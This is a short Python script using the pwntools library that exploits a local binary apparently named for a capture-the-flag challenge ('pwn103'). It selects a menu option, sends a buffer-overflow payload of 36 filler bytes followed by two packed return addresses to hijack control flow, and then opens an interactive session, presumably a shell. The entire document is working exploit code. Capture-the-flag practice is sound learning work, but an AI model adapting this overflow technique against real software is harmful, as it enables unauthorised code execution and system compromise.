from pwn import *

p = process("./pwn103.pwn103")

p.sendline(b'3')

payload = b"A"*36
payload += p32(0x401677)
payload += p32(0x401554)

p.sendline(payload)
p.recv()

p.interactive()